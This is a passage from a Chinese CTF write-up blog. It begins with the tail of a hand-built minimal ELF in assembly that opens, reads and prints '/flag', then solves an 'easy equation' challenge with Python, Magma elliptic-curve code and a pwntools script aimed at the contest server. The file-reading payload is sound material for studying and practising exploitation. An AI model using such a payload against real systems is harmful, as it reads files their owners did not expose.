      ; p_memsz<br>                dd      <span class="hljs-number">4</span>                       ;dd e_phoff       ; p_flags<br><br>                filename db <span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-number">0</span>h         ;dd e_shoff  ;dd e_flags      ; p_align         <br>                db      <span class="hljs-number">0</span> <br>                db      <span class="hljs-number">0</span><br>                dw      <span class="hljs-number">0x34</span>                    ;dw e_ehsize<br>                dw      <span class="hljs-number">0x20</span>                    ;dw e_phentsize<br>                dw      <span class="hljs-number">1</span>                       ;dw e_phnum<br>_start:<br><br>    ; sub     esp,<span class="hljs-number">0x20</span>      <br>    ;<span class="hljs-number">5</span> sys_open(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">int</span> mode)<br>    mov     ebx, filename<br>    mov     al, <span class="hljs-number">5</span><br>    <span class="hljs-keyword">int</span>     <span class="hljs-number">80</span>h<br><br>    ;<span class="hljs-number">3</span> sys_read(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> count)<br>    mov     dl, <span class="hljs-number">20</span>h             <br>    lea     ecx, [esp]          <br>    mov     ebx, eax            <br>    mov     al, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">int</span>     <span class="hljs-number">80</span>h                 <br><br>    ;<span class="hljs-number">4</span> sys_write(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> count)<br>    mov   al,<span class="hljs-number">4</span>          <br>    mov   bl,<span class="hljs-number">1</span>       <br>    <span class="hljs-keyword">int</span>   <span class="hljs-number">0x80</span><br><br>    ; <span class="hljs-number">1</span> sys_exit(<span class="hljs-keyword">int</span> error_code)<br>    mov     bl, <span class="hljs-number">42</span>      <br>    mov     al,<span class="hljs-number">1</span>     <br>    <span class="hljs-keyword">int</span>     <span class="hljs-number">0x80</span><br>  filesize      equ     $ - $$<br></code></pre></div></td></tr></table></figure>
<h3 id="easy-equation"><a class="markdownIt-Anchor" href="#easy-equation"></a> easy equation</h3>
<p>[How do you find the positive integer solutions to <a target="_blank" rel="noopener" href="https://www.quora.com/How-do-you-find-the-positive-integer-solutions-to-frac-x-y+z-+-frac-y-z+x-+-frac-z-x+y-4">math]\frac{x}{y+z}+ \frac{y}{z+x}+\frac{z}{x+y} = 4?[/math] - Quora</a></p>
<p>看了一下第一个回答的原理，然后套用了第二个回答的解题脚本，自己改一下n的值和事先求好的有理点。</p>
<p><code>An unusual cubic representation problem</code>这篇论文就是研究这个问题的，里面有个表列出来n等于不同值的时候最小解的位数：</p>
<p><img src="/posts/764dc2d/image-20230313210018991.png" srcset="/img/loading.gif" lazyload alt="image-20230313210018991"></p>
<p>可以看到，8的时候无解，12解的位数很长，所以我选择2,4,6,10,14的解来作为答案</p>
<p>n=14的时候，100次循环输出太长，不能完全展示，所以要自己手动控制一下循环次数。</p>
<p>有理点用下面的脚本求</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> fractions import Fraction as Frac<br><span class="hljs-attribute">from</span> math import gcd<br><span class="hljs-attribute">n</span> = <span class="hljs-number">100</span><br><span class="hljs-attribute">for</span> i in range(-n, n + <span class="hljs-number">1</span>):<br>    <span class="hljs-attribute">for</span> j in range(-n, n + <span class="hljs-number">1</span>):<br>        <span class="hljs-attribute">for</span> k in range(<span class="hljs-number">0</span>, n + <span class="hljs-number">1</span>):<br>            <span class="hljs-attribute">if</span> gcd(i, gcd(j, k)) == <span class="hljs-number">1</span>:<br>                <span class="hljs-attribute">if</span> i!=<span class="hljs-number">0</span> and j!=<span class="hljs-number">0</span> and k!= <span class="hljs-number">0</span> and i+k!=<span class="hljs-number">0</span> and   j+k!=<span class="hljs-number">0</span>  and i+j!=<span class="hljs-number">0</span> and i/(j+k)+j/(i+k)+k/(i+j)==<span class="hljs-number">14</span>:<br>                    <span class="hljs-attribute">print</span>((i, j, k))<br></code></pre></div></td></tr></table></figure>
<p>脚本里的方程和多项式以及有理点每次都要改一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs magma">R&lt;x,y,z&gt; := RationalFunctionField(Rationals(),3); <br> <br>problem := ((x/(y+z) + y/(x+z) + z/(x+y)) - 14) ; <br> <br>Evaluate(problem,[-47, -37, 33]); <br>problem*Denominator(problem); <br><br>P2&lt;x,y,z&gt; := ProjectiveSpace(Rationals(),2); <br>C := Curve(P2,x^3 - 13*x^2*y - 13*x^2*z - 13*x*y^2 - 25*x*y*z - 13*x*z^2 + y^3 - 13*y^2*z -<br>    13*y*z^2 + z^3); <br> <br>// fit the point to the curve C (no error is returned) <br>Pt := C![-47, -37, 33]; <br> <br>// Since all cubic homogeneous curve with at least one point define an elliptc curve, we can transform  <br>// this curve C to an elliptc curve form and just like in cryptography, we will add this known point (mapped to the corresponded curve) <br>// with itself until we get only positive coordinates and go back to C (original Problem) <br> <br>// Below, E is the curve, f is the map that maps   Points f:C -&gt; E  (C is our original curve without denominators, both curves C,E are equivalent  <br>// but in E we can &quot;Add points&quot; to get another point of E. <br>// and with f^-1 we can return to the point of C which is our original solution <br> <br>E,f := EllipticCurve(C); <br> <br>//g is the inverse g:E-&gt;C  , f:C-&gt;E     so g(f([-1,4,11]))=[-1,4,11] <br>g := f^-1; <br> <br>// We try adding the known point Pt=[-1,4,11] mapped to E, 2..100 times <br>// to see if when mapped back the added point to C gives positive coordinates <br>//, this is 2*Pt, 3*Pt, ...., 100*Pt  and then mapping back to C all these. <br>for n:=47 to 100 do <br> <br>// we calculate n times the point of C, known [-1,4,11] but mapped (via f) inside E (where we can do the &quot;n times&quot;)  <br>    nPt_inE:=n*f(Pt); <br> <br>// we take this point on E back to C via f^-1  (which we renamed as g) <br>    nPt_inC:=g(nPt_inE); <br> <br>//We obtain each coordinate of this point to see if is our positive solution, <br>// here MAGMA scales automatically the point such as Z is one always 1,  <br>// so it puts the same denominators in X,Y, so numerators of X,Y are our  <br>//solutions and denominator our Z,  think of  P=(a/c,b/c,1)   then c*P=(a,b,c) <br>    X := Numerator(nPt_inC[1]); <br>    Y := Numerator(nPt_inC[2]); <br>    Z := Denominator(nPt_inC[1]); <br> <br>printf &quot;X=%o\nY=%o\nZ=%o\n&quot;,X,Y,Z; <br> <br>// We check the condition for our original problem. <br>  if ((X gt 0) and (Y gt 0)) then <br>       printf(&quot;GOT IT!!! x=apple, y=banana, z=pineapple, check the above solution\n&quot;); <br>     break; <br>  else <br>     printf &quot;%o Nee, some coordinate was negative above, I keep in the loop\n\n&quot;,n; <br>  end if; <br> <br>end for;    <br> <br>// We check the solution fits in the original problem <br>if Evaluate(problem, [X,Y,Z]) eq 0 then <br>    printf &quot;I evaluated the point to the original problem and yes, it worked!\n&quot;; <br>else <br>    printf &quot;Mmm this cannot happen!\n&quot;; <br>end if; <br></code></pre></div></td></tr></table></figure>
<p>求出来的五组解如下：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,proxy=(socks.SOCKS5,<span class="hljs-string">&#x27;202.120.7.12&#x27;</span>,<span class="hljs-number">13337</span>))<br><br>a=&#123;&#125;<br>a[<span class="hljs-number">2</span>]=[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>]<br>a[<span class="hljs-number">4</span>]=[<span class="hljs-number">4373612677928697257861252602371390152816537558161613618621437993378423467772036</span>,<br><span class="hljs-number">36875131794129999827197811565225474825492979968971970996283137471637224634055579</span>,<br><span class="hljs-number">154476802108746166441951315019919837485664325669565431700026634898253202035277999</span>]<br>a[<span class="hljs-number">6</span>]=[<span class="hljs-number">1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023</span>,<br><span class="hljs-number">20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557</span>,<br><span class="hljs-number">2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447</span>]<br>a[<span class="hljs-number">8</span>]=[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>]<br>a[<span class="hljs-number">10</span>]=[<span class="hljs-number">221855981602380704196804518854316541759883857932028285581812549404634844243737502744011549757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</span>,<br><span class="hljs-number">269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</span>,<br><span class="hljs-number">4862378745380642626737318101484977637219057323564658907686653339599714454790559130946320953938197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</span>]<br>a[<span class="hljs-number">12</span>]=[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>]<br>a[<span class="hljs-number">14</span>]=[<span class="hljs-number">35686662438826817213563656105539275101535697856185534149345343499844688924609645885022355135918404539985234360061600350189104933602381092051318547433998422974780849873203504443997848655625530623340371134341848128666616900144765579208079985990838064549216971926322724228681888830028303266068257138844044018255271435540077145919301591275738734597339459327150605278900738075092002974105991478458558870434061142265122382216368947373807069713709930176019498122168857679124768213308531786347567931187892878408434918309016688829685352835815066580725250947929501490665081644655994535671618967990757851510884824555077182679991403377524647154791971060789752020813552933450127083583289512848480063215680871789266871667712713169422322364887230502908301686924054210360219287364955960956032042950833997524453330328272059153308291883334074276913609077731735284223918404284292419020812011476995921011741346807748175931518235517265745772175162459312702479399232407706908845419443981643112692945551070592330727356541136923766994413647861488973051126611026148759432379003889674724917944805607605522248369290505402289434909292483537959789906318874307733003636212064338665528270372138914552950520981104343589517822223391222134534938052800801473344178058681643355234652680630054983022124146408518221588969589953072079556410755020859599503506797164705586073997208789455400263349566445512977221962882867406488146422316005409966253780701584170838345028112949069889795685718655327046530483250125959173355678292967658914005638877070834611505129167951369865542011417024870301563177370018869158755113622408743199140022326059195657852986370212647002055769249427919561331384755453850684244409515534188128908717886781958319756449082516858512445042864312213606923472603131125312862163489874095569215350848020642593339333668497345496027314732958586211664873526777590213207494911489341805851119668605552962767</span>,<br><span class="hljs-number">87005542023454150524855541144750166180919865766930052623463014576174554467821213957706498855559077927873140148579022102984237075640747995279989642832992188016154244525422278966269291094999255638208855482151405506938548578978626993952306016946318459909590778342355856153147577472731880392922408448351120608836436787309376542102861246758131059387213726386714147750943829877803608813501157597297132278662569590484844550173720257728957567960401433605097886634959342671140099728318480661981670113406848719025661715441498240565928452257694284734033186800579565313362313891643040303824890693074326810596828204114920499564539002024387811501676993037142024700539208458234538805837480373101259087885435757318639663667261597412600756998748849468402910307204633942748903285652463107201618869806410335014875125086076219328243935905232512517288787677039607942380387101187256890064827850683397174701574071447859273840130243421585240230546720814792141872637351043465819000677767263935304511294609746934407215686517293774009054989655225608925542221677606386577019926666519641600364567557194208313131276771325487167689236642467808540431881464601888142548664563650077494805488093052836193825650435423280004797008818023441669902387920463908641771270053841646139610358473027295405503333253535988771195991171826325976224803312343154770764448787106871066190163308337503496520787439022463066715315188820932966437067264819835942543744914754708785528560264636221600739219290648079243002368855133337672334702546690962019521762114649491890011821844552982141986770779324959379319663450035429876647739511502891515857175267046923938895240190738331037400875186816754190488884935451452912276673912555287036698557958114181944091831763987997170817657860587503942307866008409270543838849198648993460302655964709466390742236643982561028874558104072512842460862178322605890336695658154025228215730711703698453887</span>,<br><span class="hljs-number">1709135102428266402521578879727820755289613552803360621456124607477236062710486518306973764485152792403836982447127607442256178602384138654630699081618087896504547452419077042758442686206419280715364719358444963157698332025374708249586554595335682851323392839386182223430638025377285183953532982335289152167960094778509135832533486573163055391161165455290050618906285941817273026009595891889257351919713796943557063702989409958711830323963904165120856027913035875447234054819209407636752170808481354455393229418385392070333249788177149805823305996401240529129269675319850189648765585143872927446631219018758183300260538575964857576326413621858004145085056968233978117291959507622980746386913195986770246828428505004660553304111935995749966702604925072694758649032383912238958853266784140206835764547417096028632172800108512761682168258638590405734443542959079348266711305636364545280494327703507925613838554455967641989345934135982107562442831339601728404946376557099963807693948972893157706474963068481053339310924790906172115918700323627413150856820444271874431985423216088592099275993135702445229813416554038919256687626967939077194814654296017340955433406979774456197892632603339550402577651543232076531854230456549500665301719274202267084848477851486963621280516840090062870783676271139503026167429223506897465592567885474737385462535970365299131640088862391408665388681336793214264999254388651074994672108064474559668817847730748402579997019473615639106089768908506811205164186682823067680169244405306578488165373356991213550493590509092039078377380748348705035457779199811755686614360447907451061901486558052283679831011812123254664108196829552904290039038174025870011733057320270633278578446021776430625193839865126802043272540967717004297030511020349356790240239389396001123955974292384351794841187054815564421183556415606663233835771297306290441383808134021392865157</span><br>]<br><br>p = remote(<span class="hljs-string">&#x27;111.186.57.85&#x27;</span> ,<span class="hljs-number">30288</span>)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;x:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(a[i*<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]))<br>    <br>    p.recvuntil(<span class="hljs-string">b&quot;y:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(a[i*<span class="hljs-number">2</span>][<span class="hljs-number">1</span>]))<br>    <br>    p.recvuntil(<span class="hljs-string">b&quot;z:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(a[i*<span class="hljs-number">2</span>][<span class="hljs-number">2</span>]))<br><br><br><br><br><span class="hljs-comment"># p.close()  </span><br>p.interactive()<br></code></pre></div></td></tr></table></figure>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                      <a class="hover-with-bg" href="/tags/reverse/">reverse</a>
                    
                      <a class="hover-with-bg" href="/tags/crypto/">crypto</a>
                    
                      <a class="hover-with-bg" href="/tags/misc/">misc</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，著作权归作者所有，转载请注明出处！
                  
                </p>
              
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    
      <script type="text/javascript">
        var disqus_config = function() {
          this.page.url = 'https://zino00.github.io/posts/764dc2d/';
          this.page.identifier = '/posts/764dc2d/';
        };
        Fluid.utils.loadComments('#disqus_thread', function() {
          var d = document, s = d.createElement('script');
          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        });
      </script>
    
    <noscript>Please enable JavaScript to view the comments</noscript>
  </div>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a  rel="nofollow noopener"><span>Copyrights © 2021</span></a> <i class="iconfont icon-love"></i> <a  target="_blank" rel="nofollow noopener"><span>Zino</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?d1745c2e21adaa6ae90b93f4f4d22da9";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>





  

  
    <!-- KaTeX -->
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.10/dist/katex.min.css" />
  








  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?f45dcd001d67e8f9d84f91248ea31abf";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
